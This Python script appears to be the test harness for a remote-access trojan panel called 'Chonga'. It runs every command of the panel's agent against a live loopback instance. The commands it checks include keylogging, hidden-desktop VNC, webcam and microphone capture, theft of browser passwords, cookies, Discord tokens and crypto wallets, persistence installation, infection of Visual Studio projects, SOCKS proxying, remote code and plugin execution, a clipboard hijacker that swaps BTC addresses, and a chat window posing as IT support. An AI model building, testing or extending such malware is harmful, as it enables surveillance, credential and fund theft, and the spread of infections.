#!/usr/bin/env python3
"""Smoke-test every panel command against the live loopback agent.

Runs the full allowlist, prints ok/err and a short summary. Destructive
operations are confined to a temp directory. Persistence, propagation and
proxy listeners are created and then removed again.
"""
import base64
import json
import os
import pathlib
import socket
import struct
import sys
import tempfile
import time
import urllib.request

BASE = "http://127.0.0.1:8787"
TOKEN = pathlib.Path("runtime/token.txt").read_text(encoding="utf-8").strip()


def call(cmd, args=None, timeout=40):
    body = {"cmd": cmd, "args": args or {}}
    if timeout:
        body["timeout"] = timeout
    req = urllib.request.Request(
        BASE + "/api/cmd",
        data=json.dumps(body).encode(),
        headers={"Content-Type": "application/json", "X-Panel-Token": TOKEN},
    )
    try:
        with urllib.request.urlopen(req, timeout=(timeout or 60) + 15) as r:
            return json.loads(r.read())
    except urllib.error.HTTPError as e:
        return {"ok": False, "error": "HTTP %s %s" % (e.code, e.read()[:300])}
    except Exception as e:  # noqa: BLE001
        return {"ok": False, "error": "%s: %s" % (type(e).__name__, e)}


results = []


def check(cmd, args=None, timeout=40, brief=None, expect_ok=True):
    t0 = time.time()
    r = call(cmd, args, timeout)
    dt = time.time() - t0
    ok = bool(r.get("ok"))
    data = r.get("data") or {}
    summary = ""
    err = r.get("error") or ""
    if ok:
        if brief:
            try:
                summary = brief(data)
            except Exception as e:  # noqa: BLE001
                summary = "summary failed: %r" % (e,)
        else:
            summary = json.dumps(data)[:160]
    else:
        summary = err[:200]
    status = "PASS" if (ok == expect_ok) else "FAIL"
    results.append((status, cmd, dt, summary))
    print("%-4s %-22s %6.2fs  %s" % (status, cmd, dt, summary))
    return data if ok else None


def count(key):
    def f(d):
        v = d.get(key)
        if isinstance(v, list):
            return "%d %s" % (len(v), key)
        return "%s=%s" % (key, str(v)[:80])
    return f


tmp = pathlib.Path(tempfile.mkdtemp(prefix="chonga-smoke-"))
(tmp / "hello.txt").write_text("chonga smoke test\n", encoding="utf-8")
(tmp / "sub").mkdir()
(tmp / "sub" / "nested.bin").write_bytes(os.urandom(2048))

print("== core ==")
check("ping", brief=lambda d: "pong" if "pong" in d else str(d)[:60])
check("sysinfo", brief=lambda d: "%s / %s / %s cores" % (d.get("hostname"), d.get("os", "")[:28], d.get("cores")))
check("screenshot", {"quality": 55}, 30, lambda d: "%d bytes jpeg" % len(base64.b64decode(d.get("jpeg", ""))))
check("monitors", brief=count("monitors"))
check("windows", brief=count("windows"))
check("idle", brief=lambda d: "idle=%ss" % d.get("idle"))
check("drives", brief=count("drives"))
check("clipboard_set", {"text": "chonga-clip-test"})
check("clipboard_get", brief=lambda d: repr(d.get("text"))[:60])
check("processes", brief=count("processes"))
check("keylog_start")
check("keylog_dump")
check("keylog_stop")

print("== files ==")
check("listdir", {"path": str(tmp)}, brief=count("entries"))
check("stat", {"path": str(tmp / "hello.txt")}, brief=lambda d: "%s %d bytes" % (d.get("name"), d.get("size", 0)))
check("mkdir", {"path": str(tmp / "made-here")})
check("rename", {"path": str(tmp / "made-here"), "to": str(tmp / "renamed-here")})
check("file_write", {"path": str(tmp / "written.bin"), "data": base64.b64encode(b"payload" * 100).decode(), "offset": 0})
check("file_read", {"path": str(tmp / "written.bin"), "length": 4096}, brief=lambda d: "%d bytes eof=%s" % (d.get("length", 0), d.get("eof")))
check("file_close")
check("file_hash", {"path": str(tmp / "written.bin")}, brief=lambda d: d.get("sha256", "")[:24])
check("file_search", {"root": str(tmp), "pattern": "*.bin", "limit": 20}, brief=count("results"))
check("delete", {"path": str(tmp / "renamed-here"), "recursive": True})
check("delete", {"path": str(tmp / "written.bin")})

print("== shell / exec ==")
check("shell", {"command": "whoami", "timeout": 20}, 40, lambda d: "code=%s out=%r" % (d.get("code"), (d.get("stdout") or "")[:40]))
check("run_command", {"command": "cmd /c exit 0"})
check("execute", {"path": "notepad.exe", "show": 1})
time.sleep(1)
procs = call("processes").get("data", {}).get("processes", [])
np = [p for p in procs if p.get("name", "").lower() == "notepad.exe"]
if np:
    check("process_kill", {"pid": np[0]["pid"]})
else:
    print("SKIP process_kill            no notepad process appeared")
check("process_start", {"path": "C:\\Windows\\System32\\notepad.exe"})
time.sleep(1)
procs = call("processes").get("data", {}).get("processes", [])
np = [p for p in procs if p.get("name", "").lower() == "notepad.exe"]
if np:
    check("process_kill", {"pid": np[0]["pid"]})

print("== registry ==")
check("registry", {"op": "list", "root": "HKCU", "path": "Software"}, brief=lambda d: "%d keys / %d values" % (len(d.get("keys") or []), len(d.get("values") or [])))
check("registry", {"op": "create_key", "root": "HKCU", "path": "Software\\ChongaSmoke"})
check("registry", {"op": "set", "root": "HKCU", "path": "Software\\ChongaSmoke", "name": "Probe", "type": 1, "data": "yes"})
check("registry", {"op": "list", "root": "HKCU", "path": "Software\\ChongaSmoke"}, brief=lambda d: "values=%s" % json.dumps(d.get("values"))[:80])
check("registry", {"op": "delete_key", "root": "HKCU", "path": "Software\\ChongaSmoke"})

print("== capture ==")
check("mask")
check("lift")
check("audio", {"op": "beep", "freq": 700, "ms": 120})
check("tts", {"text": "chonga smoke test"})

print("== hvnc ==")
check("hvnc_start", {}, 40)
check("hvnc_status", brief=lambda d: json.dumps(d)[:120])
check("hvnc_windows", brief=count("windows"))
check("hvnc_processes", brief=count("processes"))
check("hvnc_start_process", {"path": "C:\\Windows\\System32\\notepad.exe"}, 30)
time.sleep(1.5)
check("hvnc_frame", {"quality": 55}, 30, lambda d: "%d bytes jpeg, %s windows" % (len(base64.b64decode(d.get("jpeg", ""))), d.get("windows")))
check("hvnc_windows", brief=count("windows"))
check("hvnc_input", {"type": "mouse", "action": "click", "x": 40, "y": 40})
check("hvnc_input", {"type": "text", "text": "hello"})
check("hvnc_clipboard", brief=lambda d: repr(d.get("text"))[:40])
check("hvnc_clipboard", {"text": "hvnc-clip"})
hp = call("hvnc_processes").get("data", {}).get("processes", [])
target = [p for p in hp if "notepad" in (p.get("name") or "").lower()]
if target:
    check("hvnc_kill_process", {"pid": target[0]["pid"]})
else:
    print("SKIP hvnc_kill_process      notepad never showed on the hidden desktop")
check("hvnc_stop")
check("hvnc_status", brief=lambda d: "open=%s" % d.get("open"))

print("== webcam / mic / desktop audio ==")
check("webcam_list", {}, 60, brief=count("cameras"))
check("mic_list", {}, 30, brief=count("microphones"))
check("webcam_frame", {"index": 0, "quality": 60}, 30,
      lambda d: "%dx%d %d bytes" % (d.get("width"), d.get("height"), len(base64.b64decode(d.get("jpeg", "")))))
check("webcam_stop")
check("mic_capture", {"seconds": 1}, 30, lambda d: "%d bytes wav" % len(base64.b64decode(d.get("wav", ""))))
check("desktop_audio", {"seconds": 1}, 30, lambda d: "%d bytes wav" % len(base64.b64decode(d.get("wav", ""))))
wav = tmp / "tone.wav"
import wave
with wave.open(str(wav), "wb") as w:
    w.setnchannels(1)
    w.setsampwidth(2)
    w.setframerate(8000)
    w.writeframes(b"\x00\x00" * 800)
check("play_audio", {"wav": base64.b64encode(wav.read_bytes()).decode()}, 30)
check("stop_audio")

print("== stealer ==")
for c in ("steal_cookies", "steal_history", "steal_autofill", "steal_passwords",
          "steal_discord", "steal_roblox", "steal_wallets", "steal_extensions"):
    check(c, {}, 120, lambda d: "keys=%s" % ",".join("%s:%s" % (k, len(v) if isinstance(v, list) else v) for k, v in d.items())[:110])
check("steal_archive", {"kind": "wallets"}, 90, lambda d: "%d files, %d bytes zip" % (d.get("files", 0), len(base64.b64decode(d.get("zip", "")))))

print("== recon ==")
check("connections", {}, 40, brief=count("connections"))
check("geo", {}, 30, brief=lambda d: "%s gw=%s ifaces=%d" % (d.get("hostname"), d.get("gateway"), len(d.get("interfaces") or {})))
check("recycle_list", {}, 40, brief=count("items"))
check("startup_list", brief=count("items"))

print("== persistence ==")
check("persist_status", brief=lambda d: "active=%s" % d.get("active"))
check("startup_add", {"name": "ChongaSmoke", "command": "cmd /c echo hi"})
check("startup_list", brief=lambda d: "%d items, has=%s" % (len(d.get("items") or []), any(i.get("name") == "ChongaSmoke" for i in d.get("items") or [])))
check("startup_remove", {"name": "ChongaSmoke"})
check("persist_install", {}, 40, lambda d: "cmd=%s" % (d.get("installed") or "")[:50])
check("persist_status", brief=lambda d: "active=%s" % d.get("active"))
check("persist_remove", {}, 40, brief=lambda d: "removed=%s" % d.get("removed"))

print("== propagation ==")
proj = tmp / "proj"
proj.mkdir()
(proj / "app.csproj").write_text(
    '<Project Sdk="Microsoft.NET.Sdk">\n  <PropertyGroup>\n    <TargetFramework>net8.0</TargetFramework>\n  </PropertyGroup>\n</Project>\n',
    encoding="utf-8")
before = (proj / "app.csproj").read_text(encoding="utf-8")
check("vs_infect", {"root": str(proj), "confirm": True, "depth": 4, "limit": 10}, 60,
      lambda d: "infected=%d skipped=%d failed=%d" % (len(d.get("infected") or []), len(d.get("skipped") or []), len(d.get("failed") or [])))
check("vs_clean", {"root": str(proj), "confirm": True}, 60,
      lambda d: "restored=%d targets_removed=%d" % (len(d.get("restored") or []), len(d.get("targets_removed") or [])))
after = (proj / "app.csproj").read_text(encoding="utf-8")
print("     restore intact:", "PASS" if before == after else "FAIL")
results.append(("PASS" if before == after else "FAIL", "vs_restore_bytes", 0, "project bytes identical"))

print("== tunnel ==")
srv = socket.socket()
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("127.0.0.1", 0))
srv.listen(1)
echo_port = srv.getsockname()[1]


def echo_once():
    c, _ = srv.accept()
    while True:
        b = c.recv(4096)
        if not b:
            break
        c.sendall(b"echo:" + b)
    c.close()


import threading  # noqa: E402
threading.Thread(target=echo_once, daemon=True).start()
tun = check("proxy_open", {"host": "127.0.0.1", "port": echo_port}, 20, lambda d: "id=%s" % d.get("id"))
tid = (tun or {}).get("id")
if tid:
    check("proxy_send", {"id": tid, "data": base64.b64encode(b"ping").decode()}, brief=lambda d: "sent=%s" % d.get("sent"))
    time.sleep(0.4)
    check("proxy_recv", {"id": tid, "limit": 4096}, brief=lambda d: "data=%r closed=%s" % (base64.b64decode(d.get("data", "")), d.get("closed")))
    check("proxy_close", {"id": tid})
check("proxy_list", brief=count("tunnels"))

print("== socks5 ==")
check("proxy_start", {"port": 11080}, 20, brief=lambda d: d.get("listening"))
try:
    s5 = socket.create_connection(("127.0.0.1", 11080), timeout=5)
    s5.sendall(b"\x05\x01\x00")
    print("     greeting:", s5.recv(2).hex())
    s5.sendall(b"\x05\x01\x00\x01" + socket.inet_aton("127.0.0.1") + struct.pack("!H", echo_port))
    print("     connect:", s5.recv(4).hex())
    s5.sendall(b"over-socks")
    time.sleep(0.5)
    print("     echo:", s5.recv(64))
    s5.close()
except OSError as e:
    print("     socks5 FAILED:", e)
check("proxy_status", brief=lambda d: "running=%s accepted=%s" % (d.get("running"), d.get("accepted")))
check("proxy_stop")

print("== plugins ==")
check("code_run", {"code": "result = {'answer': 42, 'cwd': __import__('os').getcwd()}"}, 30, lambda d: (d.get("result") or "")[:80])
check("plugin_load", {"name": "smoke", "source": "def hello(args):\n    return {'echo': args.get('x'), 'pid': __import__('os').getpid()}\n\nCOMMANDS = {'hello': hello}\n"}, 30, brief=lambda d: str(d.get("commands")))
check("plugin_list", brief=count("plugins"))
check("plugin_call", {"name": "smoke", "command": "hello", "args": {"x": 7}}, 30, brief=lambda d: json.dumps(d.get("result"))[:80])
check("plugin_unload", {"name": "smoke"})

print("== rustdesk ==")
check("rustdesk_status", brief=lambda d: "installed=%s running=%d" % (d.get("installed"), len(d.get("running") or [])))

print("== messages / status ==")
check("messagebox", {"text": "Chonga smoke test", "caption": "Panel test"})
check("set_status", {"status": "busy", "note": "smoke"}, brief=lambda d: str(d))
check("set_user_status", {"text": "smoke note"})
check("purge", brief=lambda d: "removed=%s bytes=%s" % (d.get("removed"), d.get("bytes")))
check("retry")
time.sleep(4)
st = json.loads(urllib.request.urlopen(urllib.request.Request(
    BASE + "/api/state", headers={"X-Panel-Token": TOKEN}), timeout=20).read())
ok = st.get("connected")
print("%-4s %-22s %6.2fs  %s" % ("PASS" if ok else "FAIL", "reconnect", 0, "connected=%s" % ok))
results.append(("PASS" if ok else "FAIL", "reconnect", 0, "connected=%s" % ok))

print("== clipper ==")
check("clipper_start", {"btc": "bc1qsmoketestaddressxxxxxxxxxxxxxxxxxxxxxx"}, 30, brief=lambda d: str(d.get("coins")))
call("clipboard_set", {"text": "send to 1BoatSLRHtKNngkdXEeobR76b53LETtpyT"})
time.sleep(2.2)
clip = call("clipboard_get").get("data", {}).get("text", "")
print("     clipboard:", repr(clip)[:90])
check("clipper_hits", brief=lambda d: "%d hits" % len(d.get("hits") or []))
check("clipper_stop")

print("== chat ==")
check("chat", {"text": "Hello. This is IT support."}, 30, brief=lambda d: str(d))
time.sleep(1)
check("chat_send", {"text": "smoke test message"})
time.sleep(0.8)
check("chat_close")
time.sleep(0.8)

bad = [r for r in results if r[0] != "PASS"]
print("\n%d checks, %d failed" % (len(results), len(bad)))
for r in bad:
    print("  FAIL", r[1], "->", r[3])
import shutil  # noqa: E402
shutil.rmtree(tmp, ignore_errors=True)
